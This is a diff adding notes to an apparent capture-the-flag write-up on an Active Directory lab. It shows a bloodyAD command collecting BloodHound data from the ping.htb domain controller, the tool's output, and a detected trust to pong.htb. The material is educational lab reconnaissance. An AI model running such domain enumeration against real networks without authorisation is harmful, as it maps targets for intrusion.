@@ -193,3 +193,33 @@ G.James
 
 Ill use the rid brute flag since this also pulls machine accounts to get a user file
 
+I also only have read on default shares
+
+# Bloodhound collection
+
+```python
+❯❯❯ bloodyAD --host dc1.ping.htb -d ping.htb -k get bloodhound --transitive                  
+Clock skew detected. Adjusting local time by 7:59:58.951478. Retrying operation.
+[+] Connecting to LDAP server
+Clock skew detected. Adjusting local time by 7:59:58.812825. Retrying operation.
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:00, 26.81it/s]
+Generating lookuptable: 105it [00:00, 548.40it/s]
+Dumping SDs:  99%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▍ | 110/111 [00:01<00:00, 61.98it/s]
+Dumping domains: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 21.15it/s]
+Dumping users: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 25/25 [00:00<00:00, 650.14it/s]
+Dumping computers: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 93.06it/s]
+Dumping groups: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 53/53 [00:00<00:00, 1183.26it/s]
+Dumping GPOs: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3/3 [00:00<00:00, 168.87it/s]
+Dumping OUs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 66.65it/s]
+Dumping Containers: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 353.97it/s]
+[+] Bloodhound data saved to 20261121T184834_Bloodhound.zip
+[+] Found 1 trusts
+[+] Found trust pong.htb (S-1-5-21-2410575906-3092493790-2123333151)
+[+] Connecting to pong.htb (follow_trusts)
+[-] Failed to connect to pong.htb ([Errno -2] Name or service not known)
+[-] If it's a connectivity issue (not auth issue), make sure the hostname resolves to an IP address (eg. modify your /etc/hosts)
+```
+
+From this output i can see bloodyAD detects a trust, but since the machine is likely internal i cannot reach it as of yet
+
